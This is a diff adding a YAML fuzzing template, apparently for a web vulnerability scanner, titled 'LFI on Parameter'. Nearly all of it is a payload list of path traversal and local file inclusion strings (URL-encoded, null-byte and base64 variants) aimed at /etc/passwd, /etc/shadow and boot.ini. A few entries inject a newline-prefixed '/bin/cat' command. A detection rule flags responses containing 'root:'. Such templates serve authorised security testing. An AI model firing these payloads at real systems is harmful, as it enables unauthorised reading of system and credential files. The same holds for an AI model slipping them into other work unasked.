@@ -1,0 +1,68 @@
+id: lfi-03
+info:
+  name: LFI on Parameter
+  risk: High
+level: 1
+payloads:
+- '{{.dest}}'
+requests:
+- detections:
+  - StatusCode() == 200 && StringSearch("response", "root:") && StringSearch("response",
+    "/bin/bash")
+  generators:
+  - Query("{{.payload}}", "*")
+type: fuzz
+variables:
+- dest: "/.../.../.../.../.../\n\\\u2026..\\\\\\\u2026..\\\\\\\u2026..\\\\\\\n%00../../../../../../etc/passwd\n\
+    %00/etc/passwd%00\n%00../../../../../../etc/shadow\n%00/etc/shadow%00\n%0a/bin/cat%20/etc/passwd\n\
+    %0a/bin/cat%20/etc/shadow\n%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00\n\
+    %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%\
+    \  25%5c..%25%5c..%00\n%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00\n\
+    %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%\
+    \    25%5c..%25%5c..etc/passwd\n/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..etc/passwd\n\
+    ../../../../../../../../%2Aetc/passwd\n../../../../../../../../etc/passwd\n/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini\n\
+    /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n\
+    /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow\n\
+    ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\n..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow\n\
+    ..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed\n..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd\n\
+    ..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow\n=3D \u201C/..\u201D . \u201C%2f..\n..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd\n\
+    /./././././././././././etc/shadow\n/../../../../../../../../../../etc/shadow\n\
+    /../../../../../../../../../../etc/shadow^^\n/..\\../..\\../..\\../..\\../..\\\
+    ../..\\../etc/shadow\n../../../../../../../../../../../../etc/shadow\n..\\..\\\
+    ..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow\n.\\\\./.\\\\./.\\\\./.\\\\./.\\\\\
+    ./.\\\\./etc/shadow\n\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow\n../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00\n\
+    ../../../../../../../../../../../../etc/shadow%00\n..\\..\\..\\..\\..\\..\\..\\\
+    ..\\..\\..\\etc\\shadow%00\n\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow%00\n\
+    ..2fetc2fpasswd\n..2fetc2fpasswd%00\n..2f..2fetc2fpasswd\n..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2fetc2fpasswd\n..2f..2f..2fetc2fpasswd%00\n..2f..2f..2f..2fetc2fpasswd\n\
+    ..2f..2f..2f..2fetc2fpasswd%00\n..2f..2f..2f..2f..2fetc2fpasswd\n..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2fetc2fpasswd\n..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00\n\
+    ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fshadow%00\n\
+    L2V0Yy9tYXN0ZXIucGFzc3dk\nL21hc3Rlci5wYXNzd2Q=\nZXRjL3Bhc3N3ZA==\nZXRjL3NoYWRvdyUwMA==\n\
+    L2V0Yy9wYXNzd2Q=\nL2V0Yy9wYXNzd2QlMDA=\nLi4vZXRjL3Bhc3N3ZA==\nLi4vZXRjL3Bhc3N3ZCUwMA==\n\
+    Li4vLi4vZXRjL3Bhc3N3ZA==\nLi4vLi4vZXRjL3Bhc3N3ZCUwMA==\nLi4vLi4vLi4vZXRjL3Bhc3N3ZA==\n\
+    Li4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==\nLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==\nLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==\n\
+    Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==\n"
